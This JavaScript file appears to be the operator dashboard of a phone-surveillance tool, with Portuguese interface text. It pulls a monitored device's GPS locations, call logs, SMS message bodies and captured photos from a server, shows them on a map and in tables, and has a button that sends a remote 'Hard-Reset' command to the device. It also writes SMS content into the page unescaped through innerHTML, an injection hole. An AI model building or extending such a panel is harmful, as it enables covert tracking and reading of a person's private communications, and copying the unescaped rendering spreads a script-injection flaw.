const API = window.location.origin + '/api';
const token = localStorage.getItem('token');
if (!token) location.href = 'index.html';

const logoutBtn    = document.getElementById('logout');
const refreshBtn   = document.getElementById('refresh');
const hardResetBtn = document.getElementById('hardReset');

logoutBtn.onclick = () => {
  localStorage.removeItem('token');
  location.href = 'index.html';
};
refreshBtn.onclick = loadData;
hardResetBtn.onclick = async () => {
  const user = JSON.parse(atob(token.split('.')[1])).username;
  await fetch(`${API}/command/${user}`, {
    method: 'POST',
    headers: { Authorization: 'Bearer ' + token }
  });
  alert('Hard-Reset enviado');
};

let map, markers = [];
document.addEventListener('DOMContentLoaded', () => {
  map = L.map('map').setView([0, 0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '© OpenStreetMap'
  }).addTo(map);
  loadData();
});

async function loadData() {
  markers.forEach(m=>map.removeLayer(m));
  markers = [];
  document.querySelector('#callsTable tbody').innerHTML = '';
  document.querySelector('#smsTable tbody').innerHTML   = '';
  document.getElementById('photos').innerHTML           = '';

  const res = await fetch(`${API}/data`, {
    headers: { Authorization: 'Bearer ' + token }
  });
  const pts = await res.json();
  if (!pts.length) return alert('Nenhum dado disponível.');

  pts.forEach(entry => {
    const { lat, lng, date } = entry.location;
    const marker = L.marker([lat, lng]).addTo(map)
      .bindPopup(`Lat: ${lat.toFixed(5)}, Lng: ${lng.toFixed(5)}<br>${new Date(date).toLocaleString()}`);
    markers.push(marker);

    entry.calls.forEach(c => {
      const tr = `<tr>
        <td>${c.number}</td><td>${c.type}</td>
        <td>${c.duration}</td><td>${new Date(c.date).toLocaleString()}</td>
      </tr>`;
      document.querySelector('#callsTable tbody').innerHTML += tr;
    });

    entry.sms.forEach(s => {
      const tr = `<tr>
        <td>${s.from}</td><td>${s.body}</td>
        <td>${new Date(s.date).toLocaleString()}</td>
      </tr>`;
      document.querySelector('#smsTable tbody').innerHTML += tr;
    });

    if (entry.photo) {
      const img = document.createElement('img');
      img.src = 'data:image/jpeg;base64,' + entry.photo;
      document.getElementById('photos').appendChild(img);
    }
  });

  const first = pts[0].location;
  map.setView([first.lat, first.lng], 13);
}
